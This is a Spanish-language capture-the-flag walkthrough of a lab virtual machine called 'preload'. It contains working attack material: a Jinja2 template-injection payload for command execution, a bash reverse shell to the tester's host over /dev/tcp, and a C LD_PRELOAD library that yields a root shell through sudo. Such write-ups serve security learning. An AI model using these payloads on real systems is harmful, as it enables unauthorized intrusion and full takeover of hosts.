@@ -1,0 +1,140 @@
+Identificamos la ip de la víctima:
+❯ arp-scan --interface=wlo1 --localnet | grep PCS
+192.168.1.151	08:00:27:8e:15:d6	PCS Systemtechnik GmbH
+
+Enumeramos puertos:
+❯ sudo nmap -p- -sS --min-rate 5000 -n -Pn -oG 01-allPorts 192.168.1.151
+[sudo] contraseña para wh01s17: 
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-24 23:16 -0400
+Nmap scan report for 192.168.1.151
+Host is up (0.00017s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+5000/tcp open  upnp
+MAC Address: 08:00:27:8E:15:D6 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.96 seconds
+
+❯ nmap -sCV -p 22,80,5000 -oN 02-targeted.txt 192.168.1.151
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-24 23:16 -0400
+Nmap scan report for 192.168.1.151
+Host is up (0.00043s latency).
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 4f:4c:82:94:2b:99:f8:ea:67:ff:67:3c:06:8a:71:b5 (RSA)
+|   256 c4:2c:9b:c8:12:93:2f:8a:f1:57:1c:f6:ab:88:b9:61 (ECDSA)
+|_  256 10:18:7b:11:c4:c3:d4:1a:54:cc:18:68:14:bb:2e:a7 (ED25519)
+80/tcp   open  http       nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Welcome to nginx!
+5000/tcp open  landesk-rc LANDesk remote management
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
+
+Nos conectamos al servicio del puerto 5000, el cuál corre una versión de landesk-rc, que permite el control remoto de equipos:
+❯ nc 192.168.1.151 5000
+ * Serving Flask app 'code' (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+ * Running on all addresses.
+   WARNING: This is a development server. Do not use it in a production deployment.
+ * Running on http://192.168.1.151:50000/ (Press CTRL+C to quit)
+
+Vemos el servidor se ejecuta en el puerto 50000.
+
+Ingresamos a http://192.168.1.151:50000, pero solo muestra el error "Internal Server Error".
+
+Fuzzeamos en busca de parámetros:
+❯ ffuf -u 'http://192.168.1.151:50000/?FUZZ=/etc/passwd' -w ~/Documentos/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -fs 290
+...
+cmd                     [Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 515ms]
+...
+
+Ingresamos a http://192.168.1.151:50000/?cmd=, y nos muestra un mensaje de bienvenida:
+❯ curl 'http://192.168.1.151:50000/?cmd='
+Welcome!!!!!!!!!!!!!
+
+La página, muestra el mensaje que le pasemos por parámetros:
+❯ curl 'http://192.168.1.151:50000/?cmd=hello'
+hello
+
+Estamos frente a una aplicación en flask (python), la cuál, si no cuenta con las configuraciones correctas, puede llegar a ser vulnerable a SSTI.
+
+Probamos con un payload para verificar si procesa la informacion con un motor de plantillas (Jinja2):
+❯ curl "http://192.168.1.151:50000/?cmd=\{\{7*7\}\}"
+49
+
+❯ curl "http://192.168.1.151:50000/?cmd=\{\{config\}\}"
+&lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: None, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: None, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;
+
+Utilizamos el siguiente payload, el cual, no permite ejecutar comandos con el parámetro input:
+{%
+    for x in ().__class__.__base__.__subclasses__()
+%}
+    {%
+        if "warning" in x.__name__
+    %}
+        {{
+            x()._module.__builtins__['__import__']('os').popen(request.args.input).read()
+        }}
+    {% endif %}
+{% endfor %}
+
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}&input=whoami
+
+Ingresamos a http://192.168.1.151:50000/?cmd={%%20for%20x%20in%20().__class__.__base__.__subclasses__()%20%}{%%20if%20%22warning%22%20in%20x.__name__%20%}{{x()._module.__builtins__[%27__import__%27](%27os%27).popen(request.args.input).read()}}{%endif%}{%endfor%}&input=whoami, a través del navegador y obtenemos al usuario "paul".
+
+Obtenemos una shell, inyectando una reverse shell:
+http://192.168.1.151:50000/?cmd=...&input=bash -c "bash -i >& /dev/tcp/192.168.1.5/1234 0>&1"
+
+url encoded: http://192.168.1.151:50000/?cmd={%%20for%20x%20in%20().__class__.__base__.__subclasses__()%20%}{%%20if%20%22warning%22%20in%20x.__name__%20%}{{x()._module.__builtins__[%27__import__%27](%27os%27).popen(request.args.input).read()}}{%endif%}{%endfor%}&input=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.5/1234%200%3E%261%22
+
+❯ ncat -nlvp 1234
+Ncat: Version 7.97 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 192.168.1.151:43980.
+bash: cannot set terminal process group (360): Inappropriate ioctl for device
+bash: no job control in this shell
+paul@preload:/$
+
+Obtenemos una shell de paul y la primera flag.
+
+Para escalar privilegios, ejecutamos el comando sudo -l:
+paul@preload:~$ sudo -l 
+Matching Defaults entries for paul on preload:
+    env_reset, mail_badpass, env_keep+=LD_PRELOAD,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User paul may run the following commands on preload:
+    (root) NOPASSWD: /usr/bin/cat, /usr/bin/cut, /usr/bin/grep, /usr/bin/tail,
+        /usr/bin/head, /usr/bin/ss
+
+Vemos que podemos ejecutar varios comandos como root y sin contraseña, pero lo que nos llama la atención, es LD_PRELOAD, la cuál, es una variable de entorno que permite a los usuarios "precargar" bibliotecas, utilizando sudo, por lo que podemos elaborar una libreria maliciosa como indica el siguiente post https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/, y obtener una shell del usuario root:
+❯ cat pwned.c 
+#include <stdlib.h>
+#include <unistd.h>
+void _init() {
+  unsetenv("LD_PRELOAD");
+  setgid(0);
+  setuid(0);
+  system("/bin/bash");
+}
+
+Copiamos la libreria en la máquina victima, compilamos y ejecutamos:
+paul@preload:/tmp$ gcc -fPIC -shared -o pwned.so pwned.c -nostartfiles
+
+paul@preload:/tmp$ sudo LD_PRELOAD=/tmp/pwned.so ss
+
+root@preload:/tmp#
+
+Obtenemos la última flag y fin.
+
